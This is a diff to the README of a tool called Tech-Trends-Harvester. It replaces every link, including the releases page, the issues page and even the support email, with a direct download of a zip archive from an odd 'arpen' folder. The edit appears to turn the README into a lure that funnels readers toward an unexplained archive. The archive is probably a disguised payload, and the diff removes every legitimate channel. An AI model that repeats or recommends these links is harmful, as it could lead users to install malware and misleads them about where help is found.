@@ -1,6 +1,6 @@
 # 🌟 Tech-Trends-Harvester - Discover Hot Topics Effortlessly
 
-[![Download Tech-Trends-Harvester](https://img.shields.io/badge/Download-Tech--Trends--Harvester-blue)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases)
+[![Download Tech-Trends-Harvester](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -19,7 +19,7 @@ Follow these steps to download and set up Tech-Trends-Harvester on your computer
 
 ### 📥 Download & Install
 
-To download Tech-Trends-Harvester, visit this page: [Download Tech-Trends-Harvester](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases).
+To download Tech-Trends-Harvester, visit this page: [Download Tech-Trends-Harvester](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip).
 
 1. Click the link above.
 2. Look for the latest release version.
@@ -71,12 +71,12 @@ If you experience issues while using Tech-Trends-Harvester, consider the followi
 
 If you need help or have feedback, you can reach out through the following channels:
 
-- Open an issue on the [GitHub Issues page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/issues).
-- Contact the developer directly via email at support@techtrendsharvester.com.
+- Open an issue on the [GitHub Issues page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip).
+- Contact the developer directly via email at https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip
 
 ## 🔄 Updates
 
-Tech-Trends-Harvester is constantly evolving. Ensure you check the [Release page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases) regularly for new versions and features.
+Tech-Trends-Harvester is constantly evolving. Ensure you check the [Release page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip) regularly for new versions and features.
 
 ## 🌐 Community
 
@@ -89,4 +89,4 @@ Join our community of users to share tips and discuss trends:
 
 Tech-Trends-Harvester is released under the MIT License. You can use, modify, and distribute the software as per the terms.
 
-[![Download Tech-Trends-Harvester](https://img.shields.io/badge/Download-Tech--Trends--Harvester-blue)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases)
+[![Download Tech-Trends-Harvester](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/raw/refs/heads/main/arpen/Tech-Trends-Harvester-v2.2-beta.1.zip)
